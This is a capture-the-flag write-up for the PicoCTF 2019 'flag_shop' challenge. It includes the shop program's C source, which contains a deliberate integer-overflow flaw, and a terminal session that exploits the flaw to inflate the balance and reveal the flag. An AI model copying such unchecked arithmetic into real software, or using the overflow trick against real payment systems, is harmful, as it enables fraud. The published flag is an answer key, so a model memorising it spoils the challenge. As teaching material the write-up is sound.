# PicoCTF 2019 - flag_shop
Author: PinkNoize

General Skills - 300

> There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 63894.

## TL;DR

This challenge provides a shop program. Overflow the price of an item to increase your balance and buy the flag.

# Writeup

This challenge provides us with a program that simulates a shop to buy flags. The source is provided and is below.

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }   
                }   
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }     
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }
                }
            }
        }
        else{
            con = 1;
        }
    }
    return 0;
}
```

This program prints the flag if we buy a 1337 flag, so our goal is to buy the 1337 flag. We can buy the flag if our account balance is greater than 100000. Unfortunately, our account balance starts at 1100 so we have to find a way to increase our balance. Upon further inspection, our only way to change the account balance is to subtract from it, `account_balance = account_balance - total_cost;`.

The important thing to realize to solve this problem is that all the numbers in this program are of type int, which means they can be positive and negative. It also means that the ints are bounded to INT_MIN and INT_MAX because they use a fixed number of bits, usually 32 or 64. 

Another important thing is the behavior of ints when you go pass INT_MAX and INT_MIN. Adding two ints that result in a number greater than INT_MAX is known as an overflow and is undefined behavior. This happening on the INT_MIN side is an underflow. A majority of integers are represented using [two's complement](https://en.wikipedia.org/wiki/Two%27s_complement) as adding is an identical operation regardless if the numbers are positive or negative.

So how does this apply to our challenge? Going back to the line, `account_balance = account_balance - total_cost;`, if we make total cost negative we can add to our account balance so we can buy the flag. If look further up we can see how we can control `total_cost`.

```c
scanf("%d", &number_flags);
    if(number_flags > 0){
        int total_cost = 0;
        total_cost = 900*number_flags;
```

We can supply a number greater than 0 that is then multiplied by 900. As we can't supply a negative number, we have to provide a number that overflows when multiplied by 900. When the number overflows it should be negative allowing us to add an arbitrary number to our account balance. I chose to use 2^23 (8388608). We can provide this to the program as detailed below.

```
$ nc 2019shell1.picoctf.com 63894
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
8388608

The final cost is: -1040187392

Your current balance after transaction: 1040188492

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_818a7f84}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
3
```

This gives us the flag, `picoCTF{m0n3y_bag5_818a7f84}`.
